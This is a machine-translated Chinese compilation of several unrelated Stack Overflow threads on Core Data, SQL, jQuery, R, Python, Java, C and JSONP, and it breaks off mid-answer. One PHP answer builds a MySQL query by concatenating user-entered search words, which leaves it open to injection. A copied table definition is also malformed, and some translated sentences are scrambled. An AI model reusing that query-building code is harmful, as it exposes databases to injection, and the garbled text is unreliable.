> 标签：objective-c, ios, core-data, nsfetchedresultscontroller, magicalrecord

我有一个核心数据问题`NSFetchedResultsController`。我在父实体和子实体之间有一对多的关系。属性中的数组未按（数字是模型中的 int32 属性）`childFetchedResults.fetchedObjects`排序。我是否使用便利类别方法`number`似乎并不重要。`MagicalRecord`

```
NSFetchRequest *req = [Child MR_requestAllSortedBy:@"number" ascending:YES withPredicate:[NSPredicate predicateWithFormat:@"parent = %@", self.parent]];
childFetchedResults = [[NSFetchedResultsController alloc] initWithFetchRequest:req managedObjectContext:[NSManagedObjectContext MR_defaultContext] sectionNameKeyPath:nil cacheName:nil];
childFetchedResults.delegate = self;
NSError *error;
[childFetchedResults performFetch:&error];
NSLog(@"fetched objects: %@", childFetchedResults.fetchedObjects); 
```

但是，如果我使用完全相同的排序描述符对获取的对象数组进行排序，它可以正常工作：

```
NSLog(@"fetched objects: %@", [childFetchedResults.fetchedObjects sortedArrayUsingDescriptors:[NSArray arrayWithObject:[NSSortDescriptor sortDescriptorWithKey:@"number" ascending:YES]]]); 
```

我收集你只能使用 Core Data 在为获取请求指定排序描述符时可以传递给 SQLite 存储的比较器。但我觉得在这种情况下这不重要，因为 SQLite 必须支持按数字排序。

有人解决了这个问题吗？我觉得这与此处描述的问题类似：[NSSortDescriptor not being called](https://stackoverflow.com/questions/10109115/nssortdescriptor-not-being-called)。

至于`MR_requestAllSortedBy`，它在`MagicalRecord`，这里是实现：

```
+ (NSFetchRequest *) MR_requestAllSortedBy:(NSString *)sortTerm ascending:(BOOL)ascending inContext:(NSManagedObjectContext *)context
{
    NSFetchRequest *request = [self MR_requestAllInContext:context];

    NSSortDescriptor *sortBy = [[NSSortDescriptor alloc] initWithKey:sortTerm ascending:ascending];
    [request setSortDescriptors:[NSArray arrayWithObject:sortBy]];

    return request;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T03:25:14.463

所以这是由未保存更改的嵌套 MOC 获取引起的。使用父 MOC 获取或在执行获取之前保存嵌套的 MOC 可以解决问题。类似于这个问题中发生的事情：[NSSortdescriptor ineffective on fetch result from NSManagedContext](https://stackoverflow.com/questions/10253817/nssortdescriptor-ineffective-on-fetch-result-from-nsmanagedcontext)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-17T11:52:14.190

```
 NSFetchRequest *fetchRequest = [[NSFetchRequest alloc]init];
    NSEntityDescription *entity = [NSEntityDescription entityForName:@"RemainderDataBase" inManagedObjectContext:[self managedObjectContext]];
    NSSortDescriptor *nameSort = [[NSSortDescriptor alloc]initWithKey:@"title" ascending:YES];
    NSArray *sortDescriptor = [[NSArray alloc]initWithObjects:nameSort, nil];
    fetchRequest.sortDescriptors = sortDescriptor;
    NSPredicate *p1=[NSPredicate predicateWithFormat:@"startdate > %@", [NSDate date]];
    [fetchRequest setPredicate:p1];
    [fetchRequest setEntity:entity]; 
```

我想你正在寻找上面的代码..

# sql - 比较多个日期范围

> ID：10757717
> 
> 赞同：2
> 
> 时间：2012-05-25T15:59:27.200
> 
> 标签：sql, postgresql, jasper-reports, ireport, date-range

我正在使用 iReport 3.0.0、PostgreSQL 9.1。对于报告，我需要将发票中的日期范围与过滤器中的日期范围进行比较，如果过滤器范围被*覆盖*、*部分覆盖*等，则打印每个发票代码。更复杂的是，每个发票代码可以有多个日期范围。

### 表发票

```
ID  Code    StartDate   EndDate
1   111     1.5.2012    31.5.2012
2   111     1.7.2012    20.7.2012
3   111     25.7.2012   31.7.2012
4   222     1.4.2012    15.4.2012
5   222     18.4.2012   30.4.2012 
```

### 例子

过滤器：1.5.2012。- 2012 年 6 月 5 日。
我需要得到的结果是：

```
code 111 - partialy covered 
code 222 - invoice missing 
```

过滤器：1.5.2012。- 2012 年 5 月 31 日。

```
code 111 - fully covered
code 222 - invoice missing 
```

过滤器：1.6.2012。- 2012 年 6 月 30 日。

```
code 111 -  invoice missing
code 222 -  invoice missing 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-26T19:43:34.663

在评论中澄清后。

### 据我了解，您的任务：

检查所有提供的*单个*日期范围 ( `filter`) 是否包含在表 ( )中代码集的*组合*日期范围内。`invoice`

它可以用普通的 SQL 来完成，但这**不是一项简单的任务**。步骤可能是：

1.  提供日期范围作为过滤器。

2.  `invoice`每个代码在表格中组合日期范围。每个代码可以产生一个或多个范围。

3.  查找过滤器和合并发票之间的重叠

4.  分类：完全覆盖/部分覆盖。可能导致一项全覆盖、一或两个部分覆盖或不覆盖。减少到最大覆盖水平。

5.  以合理的排序顺序为（过滤器，代码）的每个组合与结果覆盖率显示一行

### Ad hoc 过滤器范围

```
WITH filter(filter_id, startdate, enddate) AS (
    VALUES
      (1, '2012-05-01'::date, '2012-06-05'::date) -- list filters here.
     ,(2, '2012-05-01', '2012-05-31')
     ,(3, '2012-06-01', '2012-06-30')
    )
SELECT * FROM filter; 
```

*或者*将它们放在（临时）表中并改用该表。

### 合并每个代码的重叠/相邻日期范围

```
WITH a AS (
    SELECT code, startdate, enddate
          ,max(enddate) OVER (PARTITION BY code ORDER BY startdate) AS max_end
-- Calculate the cumulative maximum end of the ranges sorted by start
    FROM   invoice
    ), b AS (
    SELECT *
          ,CASE WHEN lag(max_end) OVER (PARTITION BY code
                                        ORDER BY startdate) + 2 > startdate
-- Compare to the cumulative maximum end of the last row.
-- Only if there is a gap, start a new group. Therefore the + 2.
           THEN 0 ELSE 1 END AS step
    FROM   a
    ), c AS (
    SELECT code, startdate, enddate, max_end
          ,sum(step) OVER (PARTITION BY code ORDER BY startdate) AS grp
-- Members of the same date range end up in the same grp
-- If there is a gap, the grp number is incremented one step
    FROM   b
    )
SELECT code, grp
      ,min(startdate) AS startdate
      ,max(enddate) AS enddate
FROM   c
GROUP  BY 1, 2
ORDER  BY 1, 2 
```

替代最终 SELECT （可能更快，你必须测试）：

```
SELECT DISTINCT code, grp
          ,first_value(startdate) OVER w AS startdate
          ,last_value(enddate) OVER w AS enddate
FROM   c
WINDOW W AS (PARTITION BY code, grp ORDER BY startdate
             RANGE BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING) 
ORDER  BY 1, 2; 
```

## 合并到一个查询

```
WITH 
    -- supply one or more filter values
    filter(filter_id, startdate, enddate) AS (
    VALUES
      (1, '2012-05-01'::date, '2012-06-05'::date) -- cast values in first row
     ,(2, '2012-05-01', '2012-05-31')
     ,(3, '2012-06-01', '2012-06-30')
    )
    -- combine date ranges per code
    ,a AS (
    SELECT code, startdate, enddate
          ,max(enddate) OVER (PARTITION BY code ORDER BY startdate) AS max_end
    FROM   invoice
    ), b AS (
    SELECT *
          ,CASE WHEN (lag(max_end) OVER (PARTITION BY code ORDER BY startdate)
                      + 2) > startdate THEN 0 ELSE 1 END AS step
    FROM   a
    ), c AS (
    SELECT code, startdate, enddate, max_end
          ,sum(step) OVER (PARTITION BY code ORDER BY startdate) AS grp
    FROM   b
    ), i AS ( -- substitutes original invoice table
    SELECT code, grp
          ,min(startdate) AS startdate
          ,max(enddate) AS enddate
    FROM   c
    GROUP  BY 1, 2
    )
    -- match filters
    , x AS (
    SELECT f.filter_id, i.code
            ,bool_or(f.startdate >= i.startdate
              AND f.enddate   <= i.enddate) AS full_cover
    FROM   filter f
    JOIN   i ON i.enddate >= f.startdate
            AND i.startdate <= f.enddate -- only overlapping
    GROUP  BY 1,2
    )
SELECT f.*, i.code
      ,CASE x.full_cover
        WHEN TRUE  THEN 'fully covered'
        WHEN FALSE THEN 'partially covered'
        ELSE            'invoice missing'
       END AS covered
FROM   (SELECT DISTINCT code FROM i) i
CROSS  JOIN filter f -- all combinations of filter and code
LEFT   JOIN x USING (filter_id, code)    -- join in overlapping
ORDER  BY filter_id, code; 
```

在 PostgreSQL 9.1 上测试并为我工作。

# jquery - jquery - 相对于窗口外元素的位置

> ID：10757722
> 
> 赞同：0
> 
> 时间：2012-05-25T15:59:57.497
> 
> 标签：jquery, jquery-ui, position

我有一个表格和一个 div，我想使用 position() 将 div 相对于表格单元格定位：

```
var td1= $('#td1');
$("#Div1").position( { of: td1, my: 'left top', at: 'left top', offset: '0 5'} ); 
```

如果 td1 在窗口内（没有水平滚动），则 div 放置正确。但是，如果表格比窗口宽，则 div 放置错误（向左推） - position().top 是正确的，但 position().left 是这样的，div 将完全位于窗口内。我试图将表格放在宽度足够大（比窗口宽）的 div 中，但我仍然看到相同的行为。

关于如何相对于窗口外的元素正确定位 div 的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T16:35:42.660

似乎 jQuery UI 只允许使用该`collision`属性“拟合”窗口内的定位元素。您可以在没有 jQuery UI 的情况下拥有相同的功能，只需使用`.css`和`.offset`。这是一个演示：http: [//jsfiddle.net/imsky/XtV4K/](http://jsfiddle.net/imsky/XtV4K/)

保持 div 在视图中的 jQuery UI 版本（尽管不在确切位置）：

```
$(this).position({
            of: $("#td1"),
            my: "left top",
            at: "left top",
            offset: "0 5",
            collision: "fit"
        }) 
```

将 div 准确保留在需要的位置的 jQuery 版本：

```
 $(this).css({
            left: $("#td2").offset().left + "px",
            top: $("#td2").offset().top + 5 + "px"
        }); 
```

# r - 将字符串表示为 R 中的函数

> ID：10757728
> 
> 赞同：3
> 
> 时间：2012-05-25T16:00:18.820
> 
> 标签：r

我正在自动创建一系列地块，每个地块都基于一类化学品（例如金属、多氯联苯等）；出于我将省略的原因，我将图例绘制在绘图之外，并使用负值作为函数的`inset`参数`legend()`来执行此操作（例如，`inset = c(-0.2, 0)`）。由于每个化学类别都需要不同的值，因此`inset`我想使用该`hash`包创建一个哈希表来存储每个化学类别所需的值。但是，为了将这些存储在哈希表中，我将值向量存储为字符串（例如，“c(-0.2, 0)”）。

我的哈希表代码如下所示： `legend.hash <- hash(chem.class, c('c(-0.2, 0)', 'c(-0.2, 0)', 'c(-0.25, -0.4)', 'c(-0.25, -0.3)', 'c(-0.2, 0)', 'c(-0.4, -0.2)', 'c(-0.2, 0)', 'c(-0.2, 0)'))` where`chem.class`是化学类别的向量。

从结果哈希表中检索值显然是一个字符串`"c(-0.2, 0)"`，有没有一种方法可以转换这个文本字符串，以便 R 将其解释为一个可以使用如下的函数：`legend(..., inset = legend.hash[[chem.class[i]]])`？

或者有没有更好的方法来使用传统的图形系统来实现这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-25T16:06:37.603

像函数一样执行字符串的经典方法是使用`eval()`and `parse()`：

```
> eval(parse(text="c(-0.2,0)"))
[1] -0.2  0.0 
```

但我真的很想知道为什么你坚持使用散列而不是简单的列表。

```
 legend.hash <- list(c(-0.2, 0), c(-0.2, 0), c(-0.25, -0.4), c(-0.25, -0.3), 
                 c(-0.2, 0), c(-0.4, -0.2), c(-0.2, 0), c(-0.2, 0))
 names(legend.hash) <- chem.class 
```

将允许您使用您现在正在使用的确切构造，而无需所有棘手的点点滴滴`eval()`and `parse()`，尤其是考虑臭名昭著的`fortune(106)`：

```
> require(fortunes)
> fortune(106)

If the answer is parse() you should usually rethink the question.
   -- Thomas Lumley
      R-help (February 2005) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T20:26:33.687

`grconvertX`使用and`grconvertY`函数而不是使用负插图来定位您的图例可能会更好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T20:29:57.537

如果您真的想将其中包含 2 个数值的字符串转换为数字向量，请考虑使用包中的`strapply`函数`gsubfn`。这样，您就可以避免该`parse`功能以及随之而来的所有潜在问题。它也可能最终变得更快。

如果您将字符串更改为仅数字和分隔符（没有“c”和括号），那么您可以只使用`as.numeric`其结果`strsplit`可能会更快。

# javascript - 当用户滚动到特定元素的末尾时如何运行 jQuery 代码？

> ID：10757731
> 
> 赞同：3
> 
> 时间：2012-05-25T16:00:35.937
> 
> 标签：javascript, jquery

这是我的示例代码：

```
$(window).scroll(function () {
    if ($(window).scrollTop() >= $(document).height() - $(window).height()) {

            // Run code here...

    }
}); 
```

当用户滚动到页面底部时，我使用上面的代码来执行东西。相反，当用户滚动到特定元素（例如#content）而不是整个文档的底部时，如何使代码执行。

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-25T16:04:25.133

这应该可以工作。

```
$(window).scroll(function () {
    if ($(window).scrollTop() >= $(elem).position().top + $(elem).height() /* add padding if needed. */) {

            // Run code here...

    }
}); 
```

# physics - 元胞自动机的流体动力学（FHP 等）

> ID：10757732
> 
> 赞同：1
> 
> 时间：2012-05-25T16:00:37.887
> 
> 标签：physics, simulation, cellular-automata, fluid-dynamics

我正在寻找基于 CA 的流体动力学软件，例如[在 Nvidia CUDA 技术中实现 FHP 模型](http://www.ift.uni.wroc.pl/~sebastian.szkoda/msc.html)，但仍然没有运气。

我想自己“玩”这些模拟，至少阅读一些相关论文。如果软件是开源的，那就更好了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:14:06.420

一些论文可以在这里找到

*   [使用元胞自动机进行多孔介质模拟](http://www.ssdonline.sscc.ru/o-l/supercomputing.pdf)
*   [用于模拟纳米系统动力学的同步与异步元胞自动机](http://www.ssdonline.sscc.ru/o-l/syn-asyn.pdf)

来自同一组的演示文稿：

*   [GPU 上](http://ssdonline.sscc.ru/kalgin/cuda/ca.gpu.pdf)的元胞自动机（俄语）
*   [Konstantin Kalgin 主页](http://ssdonline.sscc.ru/kalgin/)：异步元胞自动机进化的并行模拟

# python - 使用python读取文本文件中的行

> ID：10757735
> 
> 赞同：0
> 
> 时间：2012-05-25T16:00:44.937
> 
> 标签：python, file, wxpython

我目前正在编写一个需要在文本文件中读取和写入行的游戏。我想知道是否有办法读取文本文件中的特定行（即文本文件中的第一行）。另外，有没有办法在特定位置写一行（即更改文件中的第一行，写几行，然后再次更改第一行）？我知道我们可以通过调用顺序读取行：

```
f.readline() 
```

编辑：根据响应，如果特定行的长度不同，显然无法读取它们。我只从事大型团队项目的一小部分工作，要改变我存储数据的方式将意味着很多工作。

但是有没有一种方法可以专门更改文件的第一行？我知道打电话：

```
f.write('text') 
```

将某些内容写入文件，但它将行写入文件末尾而不是开头。有没有办法让我在开头专门重写文本？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:03:26.483

如果保证所有行的长度相同，则可以使用`f.seek(N)`将文件指针定位在第 N 个字节（其中 N 是 LINESIZE*line_number），然后`f.read(LINESIZE)`. 否则，我不知道有任何方法可以在普通的 ASCII 文件中执行此操作（我认为这就是您要问的）。

当然，您可以将某种记录信息存储在文件的标题中，并首先阅读它以让您知道在文件中查找的位置 - 但此时您最好使用一些已经存在的外部库为您完成所有工作。

除非您的文本文件非常大，否则您始终可以将每一行存储在一个列表中：

```
with open('textfile','r') as f:
    lines=[L[:-1] for L in f.readlines()] 
```

（注意我已经去掉了换行符，所以你不必记得保留它）

然后，您可以通过添加条目、删除条目、更改条目等来操作列表。在一天结束时，您可以将列表写回文本文件：

```
with open('textfile','w') as f:
    f.write('\n'.join(lines)) 
```

这是一个小测试，它适用于我在 OS-X 上仅替换第一行。

*测试数据*

```
this line has n characters
this line also has n characters 
```

*测试.py*

```
#First, I get the length of the first line -- if you already know it, skip this block
f=open('test.dat','r')
l=f.readline()
linelen=len(l)-1
f.close()

#apparently mode='a+' doesn't work on all systems :( so I use 'r+' instead
f=open('test.dat','r+')
f.seek(0)
f.write('a'*linelen+'\n') #'a'*linelen = 'aaaaaaaaa...' 
f.close() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:11:46.703

如今，以优化的方式在文件中跳转是管理大型文件的高性能应用程序的任务。

您确定您的软件项目**需要**在运行时读取/写入文件中的随机位置吗？我认为你应该考虑改变整个方法：

如果数据很小，您可以在运行时以适当的容器格式（例如列表或字典）在内存中保存/修改/生成数据，然后一次完全写入（更改时，或仅在程序退出时）。您可以考虑查看简单的数据库。此外，还有一些不错的数据交换格式，例如 JSON，如果您的数据在运行时存储在字典中，这将是理想的格式。

举个例子，让概念更清晰。考虑您已经将数据写入`gamedata.dat`：

```
[{"playtime": 25, "score": 13, "name": "rudolf"}, {"playtime": 300, "score": 1, "name": "peter"}] 
```

这是 utf-8 编码和 JSON 格式的数据。在 Python 游戏运行时读取文件：

```
with open("gamedata.dat") as f:
    s = f.read().decode("utf-8") 
```

将数据转换为 Python 类型：

```
gamedata = json.loads(s) 
```

修改数据（添加新用户）：

```
user = {"name": "john", "score": 1337, "playtime": 1}
gamedata.append(user) 
```

约翰真的是一个 1337 游戏玩家。但是，此时，您也可以删除一个用户，更改 Rudolf 的分数或更改 Peter 的名称，......无论如何，修改后，您可以简单地将新数据写回磁盘：

```
with open("gamedata.dat", "w") as f:
    f.write(json.dumps(gamedata).encode("utf-8")) 
```

关键是您在运行时**在适当的容器类型**中管理（创建/修改/删除）数据。将数据写入磁盘时，您会写入整个数据集以保存游戏的当前状态。

# java - 虽然循环不能正常工作？

> ID：10757737
> 
> 赞同：0
> 
> 时间：2012-05-25T16:00:52.457
> 
> 标签：java, if-statement, applet, while-loop

这或多或少是我的第一个 java 项目。我无法让我的`while`循环正常工作。它的循环次数似乎与我为第一个选项输入的整数一样多。但我希望它用于我的第二个。我的电脑老师一点帮助都没有。

```
import java.awt.*;
public class Summative extends JApplet
{
    int n; //first choice variable
    int t; //time variable
    int integer; //integer input
    int x=0; //count variable
    int y=50; //test

    public void init() //Initialize method
    {
        setSize(1000, 800); //Set size

        Container c = getContentPane();
        c.setBackground(Color.GREEN); //Set background
    }    

    public void paint(Graphics g) 
    {
        super.paint(g); //Start paint method

        g.setFont(new Font("Veranda", Font.PLAIN, 20));
        g.setColor(Color.BLACK);

        g.drawString("Hello", 250, 25); //top display message

        String number = JOptionPane.showInputDialog("Would you like a custom loop count or an infinite? 1\.  Custom   2\. Infinite"); //test choice
        n = Integer.parseInt(number);
        while (n<0 || n>2);

        if (n==1);
        { 
        }
        do
        {
            String number2 = JOptionPane.showInputDialog("How many times would you like to loop?");
            integer = Integer.parseInt(number);
        }while (integer<0 || integer>99999);

        while (x < integer)
        {   
            g.drawString("hi", 200, y); 

            x+=1;
            y = y+40; //test

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T16:07:33.577

值得指出的是，您的代码中有几个杂散的分号：

```
while (n<0 || n>2);
                  ^ HERE 
```

和

```
if (n==1);
         ^ HERE 
```

此外，您从未真正看过`number2`（第二次`parseInt()`调用看起来不正确）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:07:25.590

我想你是这个意思

```
integer = Integer.parseInt(number); 
```

成为

```
integer = Integer.parseInt(number2); 
```

# c - C 运行时使用什么数据结构来存储类型大小等变量的信息？

> ID：10757739
> 
> 赞同：5
> 
> 时间：2012-05-25T16:01:03.283
> 
> 标签：c, runtime

c运行时使用什么数据结构来存储有关变量的信息，如类型、大小等

前任：

```
void foo(){
  int bar=0, goo=44;
  int*q, *p = &goo;
  //some code follows

  bar = goo + bar*9; 
  ...
  q=p;
  ... 
} 
```

在上面的代码中，我们有局部变量 bar 和 goo，当控制到达 foo 函数时，它们将被分配到堆栈上。但是，运行时将如何在稍后引用这些变量时确定这些变量是某某类型和某某大小？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T16:04:17.117

运行时不保留任何此类信息 - 它被编译成编译器生成为常量的二进制代码。编译器知道每种类型的大小，因此它知道如何生成适当的机器代码来清理堆栈、访问数组元素、访问结构的字段等等。无需在运行时保留此信息，因为二进制代码已经包含所有适当的指令。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-25T16:07:15.180

可变大小在编译时是已知的，因此无需在运行时保留它们。

```
int bar = 0; 
```

简单地转化为

```
"shift the stack pointer by 4 bytes" 
```

在运行时根本不需要知道变量类型。您可能会收到有关不兼容类型的编译器警告，例如使用 打印`int`，`%c`但这更像是对您的健全性检查。变量只是命名一块数据，如何解释它们取决于您 - 作为整数，作为指针，作为 4 个字符......

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-25T16:07:42.547

通常，此类数据在编译时被硬编码在底层机器代码中，并且在运行时不保存此类数据。

例如，假设变量 bar 放置在堆栈上。编译器会记住它在堆栈上的位置，并且所有对 bar 的后续引用都将成为机器代码，该代码在相关堆栈偏移处获取变量的大小。对于保存在处理器寄存器中的变量也是如此，对它们的引用将转换为访问适当寄存器和字节长度的机器代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T16:11:44.060

编译器知道其配置平台的此信息。编译器还有 C 头文件来告诉它各种数据类型的大小。看到[这个](http://en.wikipedia.org/wiki/Stdint.h#stdint.h)

# sharepoint - SharePoint Designer 2010 的替代方案

> ID：10757740
> 
> 赞同：2
> 
> 时间：2012-05-25T16:01:13.283
> 
> 标签：sharepoint, sharepoint-2010, sharepoint-designer

我意识到 SharePoint Designer 2010 不如其前身有用。SharePoint Designer 2010 是否有任何替代品可以让我做与 SharePoint Designer 2007 相同的事情？将 SharePoint 网站一直修改为 HTML 并将其发布回 SharePoint 服务器，以便我可以实时查看更改？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-16T21:43:29.117

SharePoint Designer 2010 是编辑实时 SharePoint 2010 网站的首选工具。

有些功能可能很难找到，但其中大部分都在那里，而且还有一些。

AFAIK别无选择。

# php - 在 MySQL 数据库字段中搜索多个文本

> ID：10757741
> 
> 赞同：0
> 
> 时间：2012-05-25T16:01:20.507
> 
> 标签：php, mysql, search

我目前有以下内容，它将在我的数据库中搜索一个字段以提及一个单词，但想知道是否有可能如果客户输入两个单词，而不是只输出与该特定格式匹配的任何内容，它实际上会分裂单词向上并返回两个单词不完全匹配的结果：

目前有

```
 WHERE title LIKE '%SEARCH TEXT HERE%'.. 
```

因此，如果用户当前输入“FISH”或“FISH FOOD”，那么它将仅返回其中包含该文本的列。

我希望发生的是，如果他们输入了多个单词，那么它实际上会将其拆分，然后搜索并返回所有单独单词的结果。

因此，“FISH FOOD”将返回所有带有单词 fish 或 food with in 的行，而不仅仅是与“FISH FOOD”匹配的任何行

使用 PHP 和 MySQL

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:04:02.800

您需要分解关键字字符串并执行如下查询：

```
WHERE title LIKE '%SEARCH%' OR title LIKE '%TEXT%' OR title LIKE '%HERE%'.. 
```

虽然更复杂，但如果您符合全文的学习曲线，我会同意 bpgergo 的回答。它比简单的“LIKE”查询有很多优点。考虑一下：

```
SELECT * FROM article WHERE title like '%BIO%' 
```

这将返回带有“BIOLOGY”、“BIography”等的任何内容。全文理解单词边界，因此这些“挑战”是地址。此外，您可以使用匹配的相关性，并在对结果进行排序时使用它。

它还考虑“停止”词，所以如果用户输入“我的鱼的食物”，它仍然只会匹配“食物”和“鱼”，因为“for”和“my”是常见的词，会被省略。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:03:31.173

将您的搜索字符串分成几部分（explode(" ", $string)）。然后为每个部分添加一个条件标题 LIKE "%$part%' OR title LIKE "%$part%' OR ...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T16:43:18.287

感谢@Greg P、@ErikFWinter 和@bpgergo 对我当时正在研究这种方法的回复，最好添加我的答案以供将来参考：

```
 $search = explode(' ', $title);
    $searchResults = 'LIKE ';
    foreach ($search as $id => $word) {
        $searchResults .= "'%" . $word . "%'";
        $searchResults .= " OR title LIKE ";
    }
    $searchResults = rtrim($searchResults," OR title LIKE ");

    return $this->db->select("SELECT videoid, title, formatloc FROM db_vList WHERE title {$searchResults} order by title asc"); 
```

可能有一个更简单的原因，但学习是非常值得学习的。

硅

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T16:06:38.123

先生，您需要的是 MySQL 的 FULLTEXT 索引。

这是一个详细的示例，可以满足您的需求。

[http://dev.mysql.com/doc/refman/5.0/en/fulltext-natural-language.html](http://dev.mysql.com/doc/refman/5.0/en/fulltext-natural-language.html)

**编辑**这是一个纯 SQL 解决方案。

为了方便SO，我在这里复制了相关的SQL：

```
CREATE TABLE articles (
d INT UNSIGNED AUTO_INCREMENT NOT NULL PRIMARY KEY,
title VARCHAR(200),
body TEXT,
FULLTEXT (title,body)
ENGINE=MyISAM;

INSERT INTO articles (title,body) VALUES
('MySQL Tutorial','DBMS stands for DataBase ...'),
('How To Use MySQL Well','After you went through a ...'),
('Optimizing MySQL','In this tutorial we will show ...'),
('1001 MySQL Tricks','1\. Never run mysqld as root. 2\. ...'),
('MySQL vs. YourSQL','In the following database comparison ...'),
('MySQL Security','When configured properly, MySQL ...');

SELECT id, body, MATCH (title,body) AGAINST
('Security implications of running MySQL as root') AS score
FROM articles WHERE MATCH (title,body) AGAINST
('Security implications of running MySQL as root'); 
```

# macros - Clojure 宏总是泄漏的吗？

> ID：10757743
> 
> 赞同：4
> 
> 时间：2012-05-25T16:01:27.023
> 
> 标签：macros, clojure

如果您阅读问题[宏 -> 使用匿名函数](https://stackoverflow.com/questions/10740265/macro-with-anonymous-functions/10740411#comment13981517_10740411)，您会发现该`->`宏不能很好地与匿名函数一起使用。要正确使用宏，您需要了解*实现*。从这个意义上说，宏是“泄漏的”——API 没有完全隐藏实现。

（足够复杂的）Clojure 宏是否总是存在泄漏的情况？

[比较：C 预处理器也会出现类似的问题，如果不小心处理宏参数，会出现奇怪的副作用。在这种情况下，可以通过将宏参数括在括号中（在宏内部）来解决问题。这并不能解决使用具有可变状态的 C 宏（即每次使用参数都会改变状态）的问题，但也许我们可以忽略函数式语言的这个问题，或者使用它`let`来避免多次评估。]

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-25T16:15:30.387

您不需要了解实现 - 文档字符串非常清楚它是如何工作的。阅读器宏也有据可查 - #(...) 将扩展为 (fn [..] ...)。鉴于这些知识和提供的文档字符串信息，很明显线程匿名函数将不起作用。根本不需要了解实现。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-25T16:35:02.550

从这个意义上说，Clojure 宏并没有泄漏。原因 -> 使用 #() 函数出人意料地工作是因为 #() 是阅读器宏，阅读器宏在“常规”宏之前扩展。所以你需要知道：

1.  宏应该做什么。-> 实际上是一个非常基本的宏，因为文档几乎准确地解释了它是如何扩展的。
2.  如果您想将阅读器宏扩展为“普通”宏，它会扩展成什么。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-04T03:02:43.030

另请注意，如果您将匿名函数包装在括号中，它将起作用：

```
=> (-> {:a 1 :b 2} :a (#(* 2 %)))
2 
```

写出匿名函数然后对其进行宏扩展很有启发性：

```
=> (-> {:a 1 :b 2} :a ((fn [el] (* 2 el))))
2 
```

和

```
=> (macroexpand-all '(-> {:a 1 :b 2} :a ((fn [el] (* 2 el)))))
((fn* ([el] (* 2 el))) (:a {:a 1, :b 2})) 
```

# java - 在 JSF 页面中硬绑定托管 bean 以检测编译中的名称问题

> ID：10757749
> 
> 赞同：1
> 
> 时间：2012-05-25T16:01:44.780
> 
> 标签：java, jsf

我了解 JSF 2.0 使用约定来定位托管 bean 的类。

```
<h:outputText value="#{productCode.productCode.prodCode}" title="ProdCode" /> 
```

在此代码中，直到执行时间在此页面中，我们才会知道类 ProductCode 是否存在以及它是否有一个名为 productCode 的成员。

**有没有机会在编译时知道名称问题？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:05:22.050

此问题并非特定于 JSF。此问题特定于所使用的开发工具集。目前尚不清楚您使用的是哪一个。如果您使用的是记事本，那您真的很不走运。但是在 Eclipse 的情况下，您想安装[JBoss Tools](http://www.jboss.org/tools)。它提供 EL 自动完成和 Ctrl+Click 导航等功能。

![在此处输入图像描述](../Images/708de31224cc47eeef98708d149c26e4.png)

假设您使用的是当前的[Indigo SR2 “Eclipse IDE for Java EE Developers”](http://www.eclipse.org/downloads/)，请转到*帮助 > 安装新软件*并输入以下 URL：

> [http://download.jboss.org/jbosstools/updates/indigo/SR2/](http://download.jboss.org/jbosstools/updates/indigo/SR2/)

在列表中，只需选择“JBoss Web 和 Java EE 开发”选项（其他不是必需的）。

请注意，不可能强制出现某种“编译错误”，因为可以通过编程方式操作属性。IDE 也可以有多聪明，几乎不可能基于 Java 源代码检测到它，并且只会产生误报。

# javascript - 我可以在 jsonp 请求的响应中设置 cookie 吗？

> ID：10757753
> 
> 赞同：1
> 
> 时间：2012-05-25T16:01:54.263
> 
> 标签：javascript, cookies, jsonp

为了更好地说明我的问题，问题可能是：

我可以从 JSONP 请求发起会话吗？

更详细：假设从我的浏览器向 myserver.com 发出 JSONP 请求。myserver.com 是否可以通过 JSONP 响应设置 cookie，以便稍后再次向 myserver.com 发出请求时（直接当 doc.host = myserver.com 或间接通过来自任意 doc.host 的另一个 JSONP 请求）那些cookies会发送给它吗？目前，浏览器似乎忽略了我使用 JSONP 响应发送的 cookie。我想要的可能吗？我在这里想念什么？

编辑：这是我做的请求，通过一个虚拟的本地 html 加载本地 js 文件，该 html 只获取最新的 jquery 并加载 js 文件：

```
$.ajax({
  url: "http://my-remote-server/jsonp/service/test",
  dataType: 'jsonp',
  data: {some:'data'},
  success:   function(responseData)
            {console.log(responseData);}
    }); 
```

上述 JSONP 请求的响应，是设置一个 cookie。由于 chrome 报告了这一点，这一点得到了证实。问题是，如果我只是重新执行上述第二次，之前设置的 cookie 不会发送回服务器。

编辑 2：我去了 Chrome cookie 浏览器（在幕后页面中），但我找不到 cookie，尽管在 JSONP 响应中收到报告（chr​​ome 的调试控制台）。这意味着服务器发送它，浏览器看到它然后将其丢弃。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-26T12:05:18.680

我找到了解决方案，这里有一些对于处理这个问题的人来说可能很有趣的信息：

从维基百科定义：

